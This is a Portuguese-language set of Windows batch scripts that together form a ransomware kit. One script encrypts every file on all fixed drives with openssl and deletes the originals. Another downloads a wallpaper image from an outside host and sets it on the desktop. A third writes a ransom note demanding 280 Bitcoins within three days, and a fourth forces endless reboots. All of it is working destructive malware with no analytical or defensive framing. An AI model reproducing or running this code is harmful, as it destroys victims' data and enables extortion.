@echo off

set "senha=3060tkj(GJK%%($*¨(@#LKTG"
set "tamanho_bloco=65536"
set "chave=%TEMP%\chave.txt"
set "iv=%TEMP%\iv.txt"
echo %senha%> %chave%
certutil -encodehex -f %chave% %chave%.hex >nul
set /p hexchave=<%chave%.hex
echo %hexchave:~0,64% > %chave%
set "tempfile=%TEMP%\tempfile"
for /f "tokens=2 delims==:" %%d in ('wmic logicaldisk get deviceid^,drivetype /format:list ^| findstr /r "^DeviceID.^DriveType.:.3"') do (
    for /r "%%d\" %%f in (*.*) do (
        if not "%%~nxf"=="criptografado.bat" (
            echo Criptografando "%%~nxf"...
            openssl enc -aes-256-cbc -e -in "%%f" -out "%tempfile%" -K %hexchave:~0,64% -iv 0 -nosalt
            del "%%f"
            ren "%tempfile%" "329976MJ_zero_G94593856ad"
        )
    )
)
del %chave% %chave%.hex
echo VOCÊ FOI HACKEADO TODOS OS ARQUIVOS FORAM ENCRIPTOGRAFADOS! PARA RESTAURA-LOS ENTRE EM CONTATO COM hackingsolutions@protonmail.com
echo Todos os arquivos foram criptografados com sucesso!
pause

@echo off
setlocal
set "URL=https://i.ibb.co/9vwQyjB/Apresenta-o1.png"
set "filename=%TEMP%\wallpaper.bmp"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%filename%')"
set "regPath=HKCU\Control Panel\Desktop"
set "wallpaperName=%filename%"
reg add "%regPath%" /v Wallpaper /t REG_SZ /d "%wallpaperName%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
pause

@echo off


set "filename=SEUS ARQUIVOS FORAM CRIPTOGRAFADOS.txt"
set "text= Caro Alvo Lezado, seus arquivos foram criptografados e somente nós podemos recuperá-los. Se você quiser recuperar seus arquivos, você precisa seguir as instruções abaixo.Instruções: Compre 280 Bitcoins.Envie os Bitcoins para o seguinte endereço: XXX.XXX.XXX. Envie um e-mail para: hackingsolutions@protonmail.com com o seguinte assunto: lUCY84906PUNKS Aguarde até que seus arquivos sejam descriptografados. Você tem 3 dias para realizar o pagamento. Caso não seja feito o pagamento até o prazo estipulado, seus arquivos serão perdidos para sempre. Lembre-se, não tente nos enganar. Temos acesso total aos seus arquivos e se você não seguir nossas instruções, não poderemos recuperá-los."


echo %text% > "%filename%"

@echo off
:loop
shutdown /r /t 600 /f
ping -n 601 127.0.0.1 >nul
goto loop


